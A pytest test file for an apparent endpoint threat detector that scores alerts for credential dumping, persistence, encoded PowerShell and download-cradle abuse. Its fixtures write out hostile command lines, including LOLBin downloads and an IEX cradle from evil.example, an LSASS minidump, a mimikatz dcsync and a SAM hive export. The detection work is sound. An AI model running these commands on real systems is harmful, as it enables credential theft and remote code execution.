"""Endpoint detector tests.

The theme these check is that context, not identity, drives the score:
`rundll32.exe` on its own should barely register, and the same binary with a
credential-dumping argument should be near the top of the range.
"""

from __future__ import annotations

import base64

from bishop.detectors.endpoint import (
    abused_hosting_contact,
    credential_dumping,
    data_staging,
    encoded_command,
    lolbin_abuse,
    masquerading,
    persistence,
    suspicious_execution_path,
    suspicious_parent_child,
)
from bishop.schema import FileObject, Process
from tests.detectors.conftest import alert, conn, proc


class TestLolbinAbuse:
    def test_bare_lolbin_scores_low(self):
        result = lolbin_abuse(alert(process=proc("rundll32.exe", "rundll32.exe shell32.dll,#61")))
        assert result.fired
        assert result.score == 0.25
        assert "nothing here says it did" in result.rationale

    def test_squiblydoo_scores_high(self):
        result = lolbin_abuse(
            alert(
                process=proc(
                    "regsvr32.exe",
                    "regsvr32.exe /s /n /u /i:http://evil.example/a.sct scrobj.dll",
                )
            )
        )
        assert result.fired
        assert result.score > 0.7
        assert "T1218.010" in result.technique_hints

    def test_certutil_as_a_downloader_fires(self):
        result = lolbin_abuse(
            alert(
                process=proc(
                    "certutil.exe", "certutil.exe -urlcache -split -f http://evil.example/p.exe"
                )
            )
        )
        assert result.fired
        assert result.score > 0.6

    def test_a_non_lolbin_process_tree_is_clear(self):
        result = lolbin_abuse(alert(process=proc("chrome.exe", "chrome.exe --type=renderer")))
        assert not result.fired
        assert "no living-off-the-land binaries" in result.rationale

    def test_lolbin_anywhere_in_the_tree_is_examined(self):
        result = lolbin_abuse(
            alert(
                process=proc("cmd.exe", "cmd.exe /c x"),
                child_processes=[proc("mshta.exe", "mshta.exe javascript:alert(1)")],
            )
        )
        assert result.fired
        assert result.facts["findings"][0]["where"] == "child_processes[0]"


class TestSuspiciousParentChild:
    def test_word_spawning_powershell_fires_hard(self):
        result = suspicious_parent_child(
            alert(
                parent_process=proc("winword.exe"),
                process=proc("powershell.exe", "powershell -nop -w hidden"),
            )
        )
        assert result.fired
        assert result.score == 0.8
        assert set(result.technique_hints) >= {"T1566.001", "T1059.001"}

    def test_explorer_spawning_powershell_is_ordinary(self):
        result = suspicious_parent_child(
            alert(parent_process=proc("explorer.exe"), process=proc("powershell.exe"))
        )
        assert not result.fired

    def test_unexpected_parent_fires_at_lower_confidence(self):
        result = suspicious_parent_child(
            alert(parent_process=proc("nginx.exe"), process=proc("cmd.exe"))
        )
        assert result.fired
        assert result.score == 0.45

    def test_no_pair_is_a_miss(self):
        result = suspicious_parent_child(alert())
        assert not result.fired
        assert "no parent/child process pair" in result.rationale

    def test_grandparent_pair_is_examined(self):
        result = suspicious_parent_child(
            alert(
                grandparent_process=proc("excel.exe"),
                parent_process=proc("cmd.exe"),
                process=proc("whoami.exe"),
            )
        )
        assert result.fired
        assert result.facts["findings"][0]["parent"] == "excel.exe"


class TestCredentialDumping:
    def test_comsvcs_minidump_fires(self):
        result = credential_dumping(
            alert(
                process=proc(
                    "rundll32.exe",
                    r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\x.dmp full",
                )
            )
        )
        assert result.fired
        assert result.score > 0.6
        assert "T1003.001" in result.technique_hints

    def test_lsass_handle_with_read_mask_fires(self):
        result = credential_dumping(
            alert(raw={"TargetImage": r"C:\Windows\system32\lsass.exe", "GrantedAccess": "0x1410"})
        )
        assert result.fired
        assert result.score >= 0.9
        assert "0x1410" in result.facts["findings"][0]["match"]

    def test_lsass_handle_without_read_access_scores_low(self):
        result = credential_dumping(
            alert(raw={"TargetImage": r"C:\Windows\system32\lsass.exe", "GrantedAccess": "0x1000"})
        )
        assert result.fired
        assert result.score < 0.5

    def test_named_tool_fires_regardless_of_arguments(self):
        result = credential_dumping(alert(process=proc("mimikatz.exe")))
        assert result.fired
        assert result.score >= 0.85

    def test_registry_hive_export_fires(self):
        result = credential_dumping(
            alert(process=proc("reg.exe", r"reg save hklm\sam C:\Users\Public\sam.hiv"))
        )
        assert result.fired
        assert "T1003.002" in result.technique_hints

    def test_dcsync_maps_to_the_ntds_subtechnique(self):
        result = credential_dumping(
            alert(process=proc("mimikatz.exe", "lsadump::dcsync /domain:corp /user:krbtgt"))
        )
        assert result.fired
        assert "T1003.003" in result.technique_hints

    def test_ordinary_process_is_clear(self):
        result = credential_dumping(alert(process=proc("notepad.exe", "notepad.exe a.txt")))
        assert not result.fired


class TestPersistence:
    def test_run_key_fires(self, registry_run_key):
        result = persistence(alert(registry_changes=[registry_run_key]))
        assert result.fired
        assert result.facts["findings"][0]["technique"] == "T1547.001"
        assert result.facts["findings"][0]["points_at_staging_directory"] is True

    def test_scheduled_task_with_encoded_action_fires_high(self, scheduled_task):
        result = persistence(alert(scheduled_tasks=[scheduled_task]))
        assert result.fired
        assert result.score >= 0.8
        assert "T1053.005" in result.technique_hints

    def test_service_install_from_programdata_fires(self, service_install):
        result = persistence(alert(service_installs=[service_install]))
        assert result.fired
        assert "T1543.003" in result.technique_hints

    def test_multiple_mechanisms_score_higher_than_one(self, registry_run_key, service_install):
        one = persistence(alert(registry_changes=[registry_run_key]))
        many = persistence(
            alert(registry_changes=[registry_run_key], service_installs=[service_install])
        )
        assert many.score > one.score
        assert len(many.facts["mechanisms"]) == 2

    def test_schtasks_create_on_the_command_line_fires(self):
        result = persistence(
            alert(
                process=proc("schtasks.exe", "schtasks /create /tn Updater /tr calc.exe /sc daily")
            )
        )
        assert result.fired

    def test_unrelated_registry_write_does_not_fire(self):
        from bishop.schema import RegistryChange

        result = persistence(
            alert(
                registry_changes=[
                    RegistryChange(key=r"HKCU\Software\Contoso\Settings", value_name="Theme")
                ]
            )
        )
        assert not result.fired

    def test_a_quiet_alert_is_clear(self):
        result = persistence(alert(process=proc("notepad.exe")))
        assert not result.fired
        assert "no reboot-surviving changes" in result.rationale


class TestEncodedCommand:
    def test_encoded_powershell_is_decoded_into_the_facts(self):
        payload = base64.b64encode("Get-Process | Out-File c:\\x.txt".encode("utf-16-le")).decode()
        result = encoded_command(
            alert(process=proc("powershell.exe", f"powershell.exe -nop -w hidden -enc {payload}"))
        )
        assert result.fired
        decoded = result.facts["findings"][0]["decoded"][0]
        assert decoded["encoding"] == "base64-utf16"
        assert "Get-Process" in decoded["text"]
        assert "T1140" in result.technique_hints

    def test_stacked_switches_raise_the_score(self):
        few = encoded_command(alert(process=proc("powershell.exe", "powershell.exe -nop x.ps1")))
        many = encoded_command(
            alert(
                process=proc(
                    "powershell.exe",
                    "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient)"
                    ".DownloadString('http://evil.example/a')",
                )
            )
        )
        assert many.score > few.score

    def test_a_plain_command_line_is_clear(self):
        result = encoded_command(
            alert(process=proc("powershell.exe", "powershell.exe -File backup.ps1"))
        )
        assert not result.fired

    def test_invisible_characters_in_a_command_are_recorded(self):
        result = encoded_command(alert(process=proc("cmd.exe", "cmd.exe /c who\u200bami")))
        assert result.fired
        assert result.facts["findings"][0]["invisible_characters"] == 1


class TestMasquerading:
    def test_right_to_left_override_fires(self):
        result = masquerading(alert(file=FileObject(name="invoice\u202egpj.exe")))
        assert result.fired
        assert result.score >= 0.85
        assert "T1036.002" in result.technique_hints

    def test_double_extension_fires(self):
        result = masquerading(alert(file=FileObject(name="report.pdf.exe")))
        assert result.fired
        assert "T1036.007" in result.technique_hints

    def test_system_binary_outside_its_directory_fires(self):
        result = masquerading(
            alert(process=Process(name="svchost.exe", path=r"C:\Users\Public\svchost.exe"))
        )
        assert result.fired
        assert "T1036.005" in result.technique_hints

    def test_system_binary_in_its_proper_home_is_clear(self):
        result = masquerading(
            alert(process=Process(name="svchost.exe", path=r"C:\Windows\System32\svchost.exe"))
        )
        assert not result.fired

    def test_unsigned_system_binary_fires(self):
        result = masquerading(
            alert(
                process=Process(
                    name="lsass.exe", path=r"C:\Windows\System32\lsass.exe", signed=False
                )
            )
        )
        assert result.fired

    def test_ordinary_document_name_is_clear(self):
        result = masquerading(alert(file=FileObject(name="quarterly-report.pdf")))
        assert not result.fired

    def test_no_file_or_process_is_a_miss(self):
        result = masquerading(alert())
        assert not result.fired
        assert "names no file or process" in result.rationale


class TestDataStaging:
    def test_password_protected_archive_in_public_fires(self):
        result = data_staging(
            alert(process=proc("7z.exe", r"7z.exe a -pSecret123 C:\Users\Public\out.7z C:\Finance"))
        )
        assert result.fired
        assert result.facts["findings"][0]["password_protected"] is True
        assert "password-protected" in result.rationale

    def test_archive_outside_a_staging_directory_scores_lower(self):
        staged = data_staging(
            alert(process=proc("7z.exe", r"7z.exe a C:\Users\Public\out.7z C:\Finance"))
        )
        elsewhere = data_staging(
            alert(process=proc("7z.exe", r"7z.exe a D:\Backups\nightly.7z C:\Finance"))
        )
        assert staged.score > elsewhere.score

    def test_no_archive_activity_is_clear(self):
        result = data_staging(alert(process=proc("notepad.exe")))
        assert not result.fired


class TestSuspiciousExecutionPath:
    def test_execution_from_temp_fires(self):
        result = suspicious_execution_path(
            alert(process=Process(name="a.exe", path=r"C:\Users\bob\AppData\Local\Temp\a.exe"))
        )
        assert result.fired
        assert "T1204.002" in result.technique_hints

    def test_signed_binary_in_temp_scores_lower(self):
        unsigned = suspicious_execution_path(
            alert(process=Process(name="a.exe", path=r"C:\Windows\Temp\a.exe", signed=False))
        )
        signed = suspicious_execution_path(
            alert(process=Process(name="a.exe", path=r"C:\Windows\Temp\a.exe", signed=True))
        )
        assert unsigned.score > signed.score

    def test_program_files_is_clear(self):
        result = suspicious_execution_path(
            alert(process=Process(name="app.exe", path=r"C:\Program Files\Contoso\app.exe"))
        )
        assert not result.fired

    def test_no_paths_is_a_miss(self):
        result = suspicious_execution_path(alert(process=Process(name="a.exe")))
        assert not result.fired
        assert "no process paths" in result.rationale


class TestAbusedHostingContact:
    def test_pastebin_contact_fires_weakly(self):
        result = abused_hosting_contact(alert(connections=[conn(0, host="pastebin.com")]))
        assert result.fired
        assert result.score == 0.35
        assert "most traffic to them is benign" in result.rationale

    def test_ordinary_destination_is_clear(self):
        result = abused_hosting_contact(alert(connections=[conn(0, host="www.microsoft.com")]))
        assert not result.fired
